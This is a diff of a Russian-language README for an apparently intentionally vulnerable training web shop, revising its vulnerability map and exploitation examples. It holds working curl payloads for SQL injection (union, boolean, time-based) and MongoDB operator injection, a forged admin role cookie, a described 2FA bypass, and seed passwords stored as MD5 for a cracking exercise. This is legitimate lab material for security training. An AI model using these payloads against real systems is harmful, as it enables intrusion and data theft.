@@ -24,11 +24,7 @@ Swagger UI доступен на `http://localhost:8000/swagger`.
 ## Карта уязвимостей (без подсказок в интерфейсе)
 
 ### SQL Injection
-- In-Band (classic/error/union): `GET /products/search?q=...`, `GET /products/<pid>`
-- Inferential blind/boolean: `GET /api/stock?id=...`
-- Inferential time-based: `GET /api/shipping?zip=...`
-- Second-order: `GET /admin/reports?u=...` (payload хранится в `users.bio` и позже вставляется в SQL)
-- Out-of-band: можно тренировать через MySQL-функции/запросы, выполняемые в SQLi точках (зависит от среды и прав DB).
+- `GET /products/search?q=...&category=...` — единственная SQLi-точка в приложении (classic/error/union/boolean/time через разные payload'ы).
 
 ### NoSQL Injection
 - `GET|POST /product/<pid>/reviews/moderation` (фильтр модерации отзывов с JSON-like значениями)
@@ -52,8 +48,11 @@ Swagger UI доступен на `http://localhost:8000/swagger`.
 - Enumeration users: разные ответы в `/auth/login`, `/auth/register` (duplicate) и `/auth/forgot`
 - Brute-force password / forgot / 2FA: слабые ограничения для обычных пользователей
 - OTP код для 2FA теперь динамический: меняется каждые 10 минут (4 цифры)
-- No rate limiting: ограничения по частоте запросов на логине отсутствуют
-- Default credentials: `alice/Hightower7`
+- В `users.twofa_secret` хранится текущий валидный 2FA-код; сервер синхронизирует его для всех пользователей каждые 10 минут (по rolling-window) и при входе/проверке 2FA
+- Login rate limiting: после 25000 попыток на один username вход блокируется на 5 минут; после успешного входа счётчик для этого username сбрасывается
+- OTP rate limiting: после 5 попыток ввода OTP аккаунт блокируется на 60 секунд
+- 2FA bypass (намеренная уязвимость): при наличии `pre_2fa_user` можно открыть `/account/dashboard` и получить полноценную сессию без проверки OTP
+- Default credentials: `alice/dancercHick2000`
 - Vulnerable password reset: токен предсказуем
 - HTTP Verb tampering: `PUT /auth/login`
 - IDOR: `GET /orders/<id>`
@@ -73,73 +72,54 @@ Swagger UI доступен на `http://localhost:8000/swagger`.
 
 ### SQL Injection
 
-**In-band (`/products/search`, `/products/<pid>`):**
+**`/products/search?q=...&category=...`:**
 ```bash
-curl "http://localhost:8000/products/search?q=' OR 1=1 -- -"
-curl "http://localhost:8000/products/search?q=' UNION SELECT 1,2,3,4 -- -"
-curl "http://localhost:8000/products/1 OR 1=1"
-```
-
-**Boolean-based blind (`/api/stock`):**
-```bash
-curl "http://localhost:8000/api/stock?id=1 AND 1=1"
-curl "http://localhost:8000/api/stock?id=1 AND 1=2"
-```
-
-**Time-based blind (`/api/shipping`):**
-```bash
-curl "http://localhost:8000/api/shipping?zip=10000"
-curl "http://localhost:8000/api/shipping?zip=10000 OR SLEEP(5)"
-```
-
-**Second-order (`/admin/reports?u=...`):**
-1) Сохранить payload в `users.bio` (через `/account/profile`) например:
-```sql
-' OR 1=1 -- 
-```
-2) Вызвать:
-```bash
-curl "http://localhost:8000/admin/reports?u=alice" -b "role=YWRtaW4="
+curl "http://localhost:8000/products/search?q=' OR 1=1 -- -&category=%"
+curl "http://localhost:8000/products/search?q=' UNION SELECT 1,2,3,4,'x' -- -&category=%"
+curl "http://localhost:8000/products/search?q=test&category=electronics' OR '1'='1"
+curl "http://localhost:8000/products/search?q=' OR IF(1=1,SLEEP(3),0) -- -&category=%"
 ```
 
 ### NoSQL Injection (`/product/<pid>/reviews/moderation`)
-Сценарий: сначала при checkout сохраняется объект карты в Mongo (`payment_cards`), после чего в админ-модерации можно сделать operator injection в поле `cardholder`.
+Сценарий: фильтр модерации принимает JSON-like значения в `author`, `rating`, `text`, `card_number`. Для демонстрации можно использовать Mongo-операторы `$where`, `$ne`, `$in`, `$regex`.
 
-1) Создать заказ с картой через `/cart/checkout` (форма корзины теперь просит cardholder/card/exp/cvv).
-2) Открыть `/product/1/reviews/moderation` под админом.
-3) В `cardholder` отправить операторный payload.
+1) Войти как админ (или подменить cookie `role=YWRtaW4=`).
+2) Открыть `/product/1/reviews/moderation`.
+3) Передавать JSON в поля фильтра (GET query или POST form).
 
+Примеры эксплуатации:
 ```bash
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d 'cardholder={"cardholder":{"$ne":null}}' \
+# $ne: получить все отзывы, где автор не alice
+curl "http://localhost:8000/product/1/reviews/moderation?author={\"$ne\":\"alice\"}&status=all" \
+  -b "role=YWRtaW4="
+
+# $in: выбрать отзывы с рейтингом 4 или 5
+curl "http://localhost:8000/product/1/reviews/moderation?rating={\"$in\":[4,5]}&status=all" \
+  -b "role=YWRtaW4="
+
+# $regex: поиск по тексту отзыва
+curl "http://localhost:8000/product/1/reviews/moderation?text={\"$regex\":\".*great.*\",\"$options\":\"i\"}&status=all" \
+  -b "role=YWRtaW4="
+
+# $where: top-level JavaScript выражение в запросе отзывов
+curl "http://localhost:8000/product/1/reviews/moderation?author={\"$where\":\"this.rating>=4\"}&status=all" \
   -b "role=YWRtaW4="
 ```
 
-Проверка операторов Mongo (через `cardholder` поле):
+Аналогично для `payment_cards`: строковый поиск работает только по **полному номеру карты** в формате `####-####-####-####` (частичные строки типа `1` не матчатся).
 ```bash
-# $ne
+# точное совпадение по номеру карты
 curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'cardholder={"cardholder":{"$ne":""}}' \
+  --data-urlencode 'card_number=4111-1111-1111-1111' \
+  --data-urlencode 'status=all' \
   -b "role=YWRtaW4="
 
-# $in
+# operator-based вариант (если нужен для демонстрации NoSQLi)
 curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'cardholder={"cardholder":{"$in":["Alice Hightower","Admin River North"]}}' \
-  -b "role=YWRtaW4="
-
-# $regex
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'cardholder={"cardholder":{"$regex":"^Alice"}}' \
-  -b "role=YWRtaW4="
-
-# $where (top-level query)
-curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data-urlencode 'cardholder={"$where":"this.cardholder && this.cvv"}' \
+  --data-urlencode 'card_number={"$regex":"^4111"}' \
+  --data-urlencode 'status=all' \
   -b "role=YWRtaW4="
 ```
 
@@ -233,5 +213,9 @@ curl "http://localhost:8000/remote/include?url=https://example.org"
 
 ## Seed users
 - `admin / Riv3rN0rth!29`
-- `alice / Hightower7`
+- `alice / dancercHick2000`
 - `bob / KestrelMoon84#`
+- `mira / Zx!9vQ2#Lm7@tP5$Hs1`
+- `niko / Qw#4Rp!8Tz@1Yv$6Nd2`
+
+> В БД пароли seed-пользователей хранятся в виде MD5-хешей (для учебного cracking-сценария через hashcat).
